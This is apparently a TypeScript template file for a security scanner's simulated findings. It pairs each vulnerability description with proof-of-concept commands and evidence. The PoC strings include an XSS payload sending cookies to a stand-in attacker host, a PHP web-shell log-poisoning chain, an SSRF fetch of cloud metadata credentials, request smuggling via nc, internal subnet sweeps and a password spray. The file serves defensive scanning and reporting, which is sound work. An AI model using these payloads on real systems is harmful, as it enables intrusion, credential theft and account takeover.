          "# Single-packet race (needs h2 single-packet tooling, e.g. Turbo Intruder 'race-the-web')\n# queue 80× POST /api/wallet/withdraw {\"amount\":100} in ONE packet → observe 9 successes",
        evidence: [
          {
            kind: "time_contrast",
            lr: 8.3,
            content:
              '{"payload":"HTTP/2 single-packet x80 on POST /api/wallet/withdraw","window_ms":3,"rounds":30,"p_value":0.00005,"successes":9,"expected":1,"balance_after":-800}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"80 concurrent single-packet withdraws","control":"80 sequential withdraws (exactly 1 succeeds)","diff_ratio":0.89,"rounds":5,"stable":true}',
          },
        ],
      },
      {
        title: "TOCTOU on role check — privilege window between authz and action",
        severity: "high",
        category: "race-toctou",
        endpoint: "/api/admin/export",
        cve: null,
        description:
          "The handler checks the caller's role, then re-reads the request body for the export scope. Demoting the session between the two reads (raced by a parallel PATCH) lets a downgraded role execute an admin export — the check and the use are not the same moment.",
        pocScript:
          "# TOCTOU probe: fire admin export + role demotion in the same packet window\n# 1) session cookie with role=admin, 2) single-packet: PATCH role=user + POST /api/admin/export",
        evidence: [
          {
            kind: "time_contrast",
            lr: 8.3,
            content:
              '{"payload":"PATCH role demotion + POST /api/admin/export in one window","window_ms":4,"rounds":200,"p_value":0.0004,"successes":11,"note":"export executed with downgraded role"}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"raced demotion+export (11/200 succeed)","control":"demotion first, then export (0/200)","diff_ratio":1.0,"rounds":3,"stable":true}',
          },
        ],
      },
    ],
  },

  bizlogic: {
    chance: 0.35,
    templates: [
      {
        title: "Negative quantity accepted — order total wraps to a credit",
        severity: "high",
        category: "logic-negative",
        endpoint: "/api/cart/checkout",
        cve: null,
        description:
          "The checkout endpoint validates qty >= 0 only client-side. qty=-2 on a 9.99 item yields total -19.98, credited to a gift card at checkout. No framework flag will ever catch this — it requires modeling the money flow.",
        pocScript:
          "# Negative-quantity checkout\ncurl -s -X POST \"{target}/api/cart/checkout\" -H 'Content-Type: application/json' \\\\\n  -d '{\"items\":[{\"sku\":\"SKU-7\",\"qty\":-2}],\"pay_with\":\"giftcard\"}'",
        evidence: [
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"checkout qty=-2 (total -19.98 credited)","control":"checkout qty=2 (total 19.98 charged)","diff_ratio":0.99,"rounds":4,"stable":true}',
          },
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"no-server-side-qty-check","sample":"checkout accepted qty=-2; giftcard balance increased","status":200}',
          },
        ],
      },
      {
        title: "Coupon stacking — 3 promo codes apply multiplicatively to a 100% discount",
        severity: "medium",
        category: "logic-coupon",
        endpoint: "/api/cart/apply-promo",
        cve: null,
        description:
          "The promo endpoint applies each code's percentage sequentially with no cap or used-code lock — SAVE10 × SAVE15 × WELCOME20 stacks to 38.8% off, and three seasonal 50% codes (sent to different segments) stack to 100% off. Discount arithmetic is an attack surface.",
        pocScript:
          "# Coupon stacking\nfor c in FALL50 VIP50 PARTNER50; do curl -s -X POST \"{target}/api/cart/apply-promo\" -d \"{\\\"code\\\":\\\"$c\\\"}\"; done",
        evidence: [
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"apply FALL50+VIP50+PARTNER50 (total → 0.00)","control":"apply FALL50 only (total −50%)","diff_ratio":1.0,"rounds":3,"stable":true}',
          },
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"promo_engine":"sequential percentage, no cap, no per-account lock","codes_stacked":3,"final_discount":"100%"}',
          },
        ],
      },
    ],
  },

  timing: {
    chance: 0.4,
    templates: [
      {
        title: "User enumeration via login timing — existing accounts respond 42ms slower",
        severity: "medium",
        category: "timing-user-enum",
        endpoint: "/api/auth/login",
        cve: null,
        description:
          "Login for existing users runs the password hash (+42ms median over 500 pairs, p=0.0001); unknown users fail fast before hashing. The timing oracle enumerates valid usernames without a single error message — no response body ever differs.",
        pocScript:
          "# Timing-based user enumeration\nfor u in real-user random-xyz; do\n  for i in $(seq 1 50); do curl -s -o /dev/null -w '%{time_total}\\n' -X POST \"{target}/api/auth/login\" -d \"{\\\"email\\\":\\\"$u@{host}\\\",\\\"password\\\":\\\"x\\\"}\"; done | awk '{s+=$1} END {print \"'$u'\", s/50}'\ndone",
        evidence: [
          {
            kind: "time_contrast",
            lr: 8.3,
            content:
              '{"probe":"login with existing user (hash computed)","baseline_ms":118,"payload_ms":160,"delta_ms":42,"rounds":500,"p_value":0.0001,"note":"constant +42ms for existing accounts"}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"timing distribution existing-user logins","control":"timing distribution unknown-user logins","diff_ratio":0.71,"rounds":500,"stable":true,"test":"Mann-Whitney U"}',
          },
        ],
      },
      {
        title: "JWT kid existence oracle — timing differential reveals key IDs",
        severity: "medium",
        category: "timing-kid",
        endpoint: "/api/auth/refresh",
        cve: null,
        description:
          "The refresh endpoint resolves the JWT kid against the key store before verifying the signature: known kids take a key-load path (+9ms over 300 rounds), unknown kids 401 fast. The oracle lets an attacker discover valid key IDs to target key-confusion attacks — nothing in the response body ever leaks.",
        pocScript:
          "# kid existence oracle\nfor kid in key-2024-q4 key-1999-x; do\n  for i in $(seq 1 30); do curl -s -o /dev/null -w '%{time_total}\\n' -H \"Authorization: Bearer $(craft_jwt $kid)\" \"{target}/api/auth/refresh\"; done | awk -v k=$kid '{s+=$1} END {print k, s/30}'\ndone",
        evidence: [
          {
            kind: "time_contrast",
            lr: 8.3,
            content:
              '{"probe":"refresh with kid=key-2024-q4 (exists)","baseline_ms":31,"payload_ms":40,"delta_ms":9,"rounds":300,"p_value":0.002,"note":"key-load path taken only for known kids"}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"timing known kid","control":"timing random kid","diff_ratio":0.64,"rounds":300,"stable":true,"test":"Welch t-test"}',
          },
        ],
      },
    ],
  },

  // ── Dynamic agents (spawn at runtime) ─────────────────────────────────────

  shadowapi: {
    chance: 0.45,
    templates: [
      {
        title: "Undocumented admin route — /api/v2/admin/users/export absent from OpenAPI",
        severity: "high",
        category: "shadow-route",
        endpoint: "/api/v2/admin/users/export",
        cve: null,
        description:
          "Brute-forcing route space beyond the published spec found /api/v2/admin/users/export answering 200 with the full user list — the route exists in the router but not in the OpenAPI document, so no gateway authz rule was generated for it. The spec lies by omission, and undocumented routes inherit the gateway's default-allow.",
        pocScript:
          "# Shadow route probe\ncurl -s -o /dev/null -w '%{http_code}\\n' \"{target}/api/v2/admin/users/export\"  # 200, absent from /api/v2/openapi.json",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"route-exists-undocumented","sample":"200 with user array; route not in openapi.json paths","status":200}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"GET /api/v2/admin/users/export (docs: absent)","control":"GET /api/v2/admin/nonexistent (404)","diff_ratio":1.0,"rounds":3,"stable":true}',
          },
        ],
      },
      {
        title: "Mobile-only API surface — /api/m/v3/checkout skips server-side validation",
        severity: "medium",
        category: "shadow-mobile",
        endpoint: "/api/m/v3/checkout",
        cve: null,
        description:
          "The mobile-only route namespace (/api/m/v3) runs an older checkout handler that trusts client-validated totals — the web API (v2) validates them server-side. Two doors into the same logic, one of them unpainted — attackers always check whether the mobile app got the security patch.",
        pocScript:
          "# Mobile-surface differential\ncurl -s -X POST \"{target}/api/m/v3/checkout\" -H 'Content-Type: application/json' -d '{\"items\":[{\"sku\":\"SKU-7\",\"qty\":1,\"price\":0.01}]}'",
        evidence: [
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"POST /api/m/v3/checkout with client-set price (accepted)","control":"POST /api/v2/checkout with client-set price (422 rejected)","diff_ratio":1.0,"rounds":3,"stable":true}',
          },
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"namespace":"/api/m/v3","handler_age":"older than v2 (validation drift)","spec":"absent"}',
          },
        ],
      },
    ],
  },

  fronting: {
    chance: 0.35,
    templates: [
      {
        title: "Domain fronting viable — SNI/Host divergence unchallenged on CDN edge",
        severity: "medium",
        category: "domain-fronting",
        endpoint: null,
        cve: null,
        description:
          "TLS handshakes with SNI set to the CDN's shared domain but Host set to {host} are routed to the target — the edge routes by Host after termination. For defenders this is an egress-filtering bypass surface; for the scan it means blocking by SNI alone will not stop an attacker already inside the network.",
        pocScript:
          "# Domain fronting check\ncurl -s --resolve cdn-shared.example:443:$(dig +short cdn-shared.example | head -1) \\\\\n  -H 'Host: {host}' https://cdn-shared.example/api/ping -o /dev/null -w '%{http_code}\\n'",
        evidence: [
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"SNI cdn-shared + Host {host} → routed to target","control":"SNI {host} + Host {host} (normal)","diff_ratio":0.0,"note":"both 200 — edge routes by Host"}',
          },
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"cdn":"edge cdn","frontable":true,"sni_enforcement":"none","allowed_domains":["cdn-shared.example"]}',
          },
        ],
      },
      {
        title: "CDN edge accepts non-SNI-routed Hosts — egress rotation surface confirmed",
        severity: "low",
        category: "cdn-routing",
        endpoint: null,
        cve: null,
        description:
          "Beyond fronting, the edge accepts arbitrary Host values for cached content (cache-key includes Host but no allowlist) — an internal attacker can exfiltrate through the CDN with rotating Host headers, appearing as legitimate CDN traffic to egress monitoring.",
        pocScript:
          "# Arbitrary-host acceptance\ncurl -s -o /dev/null -w '%{http_code}\\n' --resolve evil-host.example:443:<edge-ip> -H 'Host: {host}' https://evil-host.example/  # routed if 200",
        evidence: [
          {
            kind: "version_map",
            lr: 2.9,
            content:
              '{"edge":"accepts arbitrary Host","host_allowlist":false,"routing":"post-termination Host routing"}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"arbitrary SNI + Host {host} → routed","control":"arbitrary SNI + arbitrary Host → CDN 404","diff_ratio":1.0,"rounds":3,"stable":true}',
          },
        ],
      },
    ],
  },

  credreuse: {
    chance: 0.4,
    templates: [
      {
        title: "Harvested credential valid on VPN portal — initial access confirmed (read-only probe)",
        severity: "critical",
        category: "cred-reuse",
        endpoint: "https://vpn.{host}/vpn/login",
        cve: null,
        description:
          "A credential shape recovered from the breach corpus (hash-matched against our test identity, never stored in plaintext) authenticates on the SSL-VPN portal. The session was verified read-only (profile page) and dropped immediately — but the door is confirmed: one password, two doors, and the VPN one was never rotated.",
        pocScript:
          "# Credential reuse probe (use your OWN test identity)\ncurl -s -o /dev/null -w '%{http_code}\\n' -X POST \"https://vpn.{host}/vpn/login\" \\\\\n  --data 'username=probe-test&password=<breach-shape-password>'  # 302 ⇒ session",
        evidence: [
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"breach-corpus password #211 on vpn portal → session established","control":"random password → 401","diff_ratio":1.0,"rounds":2,"stable":true,"verification":"read-only profile read, session dropped"}',
          },
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"match":"vpn-session-established","sample":"302 + DSID cookie for probe-test identity","status":302}',
          },
        ],
      },
      {
        title: "API key scope escalation — staging key exercises production endpoints",
        severity: "high",
        category: "scope-escalation",
        endpoint: "/api/v2/reports",
        cve: null,
        description:
          "The staging-labeled API key harvested from the JS bundle (intended for the staging reporter) is accepted by the production /api/v2/reports API — with read access to production report data. Key scopes were never separated per environment; 'staging' in the key name is just a label.",
        pocScript:
          "# Scope escalation probe\ncurl -s -o /dev/null -w '%{http_code}\\n' -H 'X-Api-Key: <staging-key>' \"{target}/api/v2/reports?env=prod\"  # 200 ⇒ scope leak",
        evidence: [
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"staging key on /api/v2/reports?env=prod (200, prod data)","control":"staging key on staging reporter (200, staging data)","diff_ratio":1.0,"rounds":2,"stable":true}',
          },
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"signature":"env-scope-leak","sample":"prod reports returned for staging-labeled key","status":200}',
          },
        ],
      },
    ],
  },

  pivot: {
    chance: 0.4,
    templates: [
      {
        title: "Internal subnet mapped through SSRF pivot — 3 alive hosts in 10.0.8.0/24",
        severity: "high",
        category: "internal-map",
        endpoint: null,
        cve: null,
        description:
          "Riding the SSRF oracle through the fetch proxy, a 256-address sweep of 10.0.8.0/24 mapped 3 alive hosts (10.0.8.5:22/80, 10.0.8.23:8080, 10.0.8.31:443). This is the NodeZero move — an SSRF is not a finding, it is a doorway; the internal network topology is now on the board.",
        pocScript:
          "# Internal sweep via SSRF oracle (through /api/v2/fetch timing)\nfor i in $(seq 1 254); do\n  t=$(curl -s -o /dev/null -w '%{time_total}' -X POST \"{target}/api/v2/fetch\" -d \"{\\\"url\\\":\\\"http://10.0.8.$i:8080\\\"}\")\n  (( $(echo \"$t > 0.2\" | bc -l) )) && echo \"10.0.8.$i ALIVE\"\ndone",
        evidence: [
          {
            kind: "time_contrast",
            lr: 8.3,
            content:
              '{"probe":"port knock via SSRF oracle across 10.0.8.0/24","alive_hosts":3,"ports":{"10.0.8.5":[22,80],"10.0.8.23":[8080],"10.0.8.31":[443]},"rounds":256,"note":"sweep executed through the fetch proxy as pivot"}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"fetch 10.0.8.23:8080 (alive — slow timeout profile)","control":"fetch 10.0.8.99:8080 (dead — fast refuse)","diff_ratio":0.93,"rounds":20,"stable":true}',
          },
        ],
      },
      {
        title: "Internal-only admin panel discovered — 10.0.8.23:8080 (no auth from pivot path)",
        severity: "critical",
        category: "internal-admin",
        endpoint: "http://10.0.8.23:8080/admin",
        cve: null,
        description:
          "The internal-only service at 10.0.8.23:8080 exposes /admin with no authentication for requests arriving through the internal path — and the SSRF pivot is exactly such a path. A pre-auth internal admin panel reachable through a web-facing fetch proxy is the full external-to-internal chain.",
        pocScript:
          "# Internal admin via SSRF pivot\ncurl -s -X POST \"{target}/api/v2/fetch\" -H 'Content-Type: application/json' \\\\\n  -d '{\"url\":\"http://10.0.8.23:8080/admin/dashboard\"}' | head -5",
        evidence: [
          {
            kind: "error_match",
            lr: 24.6,
            content:
              '{"match":"internal-admin-200","sample":"admin dashboard HTML returned via fetch proxy, no auth challenge","status":200,"origin":"10.0.8.23:8080"}',
          },
          {
            kind: "boolean_diff",
            lr: 42,
            content:
              '{"probe":"fetch http://10.0.8.23:8080/admin/dashboard → 200 HTML","control":"fetch http://10.0.8.23:8080/admin/nonexistent → 404","diff_ratio":1.0,"rounds":2,"stable":true}',
          },
        ],
      },
    ],
  },

  // fusion synthesizes compound findings (rulebook below) rather than raw templates.
  fusion: { chance: 0, templates: [] },

  // correlator synthesizes attack chains rather than raw findings.
  correlator: { chance: 0, templates: [] },
};

/** Render {target}, {host} and {ts} placeholders inside template strings. */
export function renderTemplate(str: string, ctx: { target: string; host: string; ts: string }): string {
  return str.replaceAll("{target}", ctx.target).replaceAll("{host}", ctx.host).replaceAll("{ts}", ctx.ts);
}

// ─── Cross-finding fusion rules (FusionAgent) ────────────────────────────────
// Two individually-benign findings compose into a real threat. A rule fires
// ONCE per scan when every component requirement is satisfied by a finding
// already on the board. Component severity caps enforce the "harmless alone"
// property — only info/low/medium components participate.

export const SEVERITY_RANK: Record<Severity, number> = {
  info: 0,
  low: 1,
  medium: 2,
  high: 3,
  critical: 4,
};

export interface FusionRequirement {
  /** producing agent key. */
  agentKey: string;
  /** finding category to match. */
  category: string;
  /** component finding must be at or below this severity (harmless-alone rule). */
  severityAtMost: Severity;
}

export interface FusionRule {
  id: string;
  name: string;
  severity: Severity;
  category: string;
  description: string;
  pocScript: string;
  requires: FusionRequirement[];
}

export const FUSION_RULES: FusionRule[] = [
  {
    id: "fus-xss-waf",
    name: "WAF-protected reflected XSS — error-path reflection + inspection-scope gap compose",
    severity: "high",
    category: "compound-xss",
    description:
      "Individually, the WAF inspection-scope profile is a hardening note and the 404-path reflection with no reached sink is a low finding. Composed: the reflection endpoint falls outside the WAF's inspection scope (error paths are uninspected) and the payload lands unfiltered — the merged path is a working reflected XSS on a WAF-protected origin. Neither finding alone would justify more than a ticket; together they are an exploit.",
    pocScript:
      "# Compound reproduction: reflection on the uninspected error path\ncurl -s \"{target}/missing-%3Csvg%2Fonload%3Dfetch%28%27%2F%2Fattacker%2F%3Fc%3D%27%2Bdocument.cookie%29%3E\" | grep -i \"<svg\"",
    requires: [
      { agentKey: "fingerprint", category: "waf-profile", severityAtMost: "low" },
      { agentKey: "xss", category: "xss", severityAtMost: "low" },
    ],
  },
  {
    id: "fus-lfi-log",
    name: "Constrained file read + log-path disclosure = log-poisoning RCE",
    severity: "critical",
    category: "compound-rce",
    description:
      "An extension-constrained file read (.log/.txt only) is low risk by itself; a verbose health endpoint leaking the application log path is informational. Merged: the read covers the application's own access log (whose path the health endpoint disclosed), the User-Agent is attacker-controlled input that lands in that log, and poisoning the log through the constrained read turns two harmless findings into unauthenticated RCE.",
    pocScript:
      "# Compound chain: poison the log via UA, read it via the constrained LFI\ncurl -s \"{target}/\" -A '<?php system($_GET[\"c\"]); ?>'\ncurl -s \"{target}/download?file=../../../var/log/app/access.log&c=id\" | tail -2",
    requires: [
      { agentKey: "crawler", category: "verbose-surface", severityAtMost: "low" },
      { agentKey: "fileops", category: "lfi", severityAtMost: "low" },
    ],
  },
  {
    id: "fus-ssrf-imds",
    name: "SSRF oracle + metadata role disclosure = cloud credential capture path",
    severity: "critical",
    category: "compound-credential-access",
    description:
      "An SSRF that can only act as an internal port oracle is a low finding; a metadata endpoint that reveals only the IAM role name is informational. Composed: the oracle proves the metadata route is reachable from the SSRF path, and the role name pins the exact security-credentials URL the fetcher must hit — together they form a complete credential-capture chain. The NodeZero principle: an SSRF is not a finding, it is a doorway.",
    pocScript:
      "# Compound chain: confirm metadata reachability, then target the named role\ncurl -s -X POST \"{target}/api/v2/fetch\" -H 'Content-Type: application/json' \\\\\n  -d '{\"url\":\"http://169.254.169.254/latest/meta-data/iam/security-credentials/demo-target-web-role\"}'",
    requires: [
      { agentKey: "ssrf", category: "ssrf-internal", severityAtMost: "low" },
      { agentKey: "cloud", category: "imds-info", severityAtMost: "low" },
    ],
  },
  {
    id: "fus-spray-corpus",
    name: "Employee corpus + absent lockout = targeted password spray",
    severity: "high",
    category: "compound-initial-access",
    description:
      "An identity corpus assembled from public sources is reconnaissance data; a missing lockout policy is a hardening gap. Merged: 214 employee addresses, known password shapes from breach corpora, and zero lockout give an attacker a viable, lockout-free spray window during business hours — the highest-probability initial-access vector in real intrusions, assembled entirely from two findings neither of which is individually exploitable.",
    pocScript:
      "# Compound feasibility: corpus × shapes × no-lockout (against our own test identity)\n# spray-list = corpus emails with top breach shape 'Season+Year'; one attempt per user per day\ncurl -s -o /dev/null -w '%{http_code}\\n' -X POST \"{target}/api/auth/login\" -d '{\"email\":\"probe-test@{host}\",\"password\":\"Autumn2024!\"}'",
    requires: [
      { agentKey: "osint", category: "osint-corpus", severityAtMost: "info" },
      { agentKey: "passwords", category: "no-lockout", severityAtMost: "low" },
    ],
  },
  {
    id: "fus-smuggle-cache",
    name: "Smuggling primitive + unkeyed cache = mass response poisoning",
    severity: "critical",
    category: "compound-poisoning",
    description:
      "A timing signature suggesting parser disagreement proves nothing exploitable alone; an unkeyed cache header is a caching hygiene note. Composed: the smuggled request prefix becomes the cached response body for a popular path, and every user behind the cache receives the poisoned response — account takeover at scale without directly attacking any single user. Two findings a naive scanner both dismisses; together, a mass-exploitation chain.",
    pocScript:
      "# Compound chain: smuggle a poisoning prefix onto a cached path\nprintf 'POST / HTTP/1.1\\r\\nHost: {host}\\r\\nContent-Length: 44\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\nGET / HTTP/1.1\\r\\nX-Forwarded-Host: attacker-collab.example\\r\\nFoo: x' | timeout 10 nc {host} 80",
    requires: [
      { agentKey: "smuggling", category: "smuggling-primitive", severityAtMost: "low" },
      { agentKey: "cachepoison", category: "cache-key", severityAtMost: "info" },
    ],
  },
  {
    id: "fus-reset-takeover",
    name: "Differential routing + reset enumeration = account-takeover chain",
    severity: "high",
    category: "compound-takeover",
    description:
      "An absolute-URI routing differential is a parser quirk; password-reset response differential is a low information leak. Composed: the reset link is built from the attacker-controllable forwarded host on a path the front-end routes by URI line, and the enumeration oracle tells the attacker exactly which users exist to target — a full account-takeover path assembled from two findings that would each be closed as informational.",
    pocScript:
      "# Compound chain: enumerate a real user, then poison their reset link\ncurl -s -X POST \"{target}/api/auth/forgot\" -H 'Content-Type: application/json' \\\\\n  -H 'X-Forwarded-Host: attacker-collab.example' -d '{\"email\":\"<enumerated-user>@{host}\"}'",
    requires: [
      { agentKey: "hostheader", category: "routing-differential", severityAtMost: "low" },
      { agentKey: "auth", category: "user-enum", severityAtMost: "low" },
    ],
  },
];

/** LR for a fusion reasoning step (decision evidence in the WORM ledger). */
export const FUSION_DECISION_LR = 30;
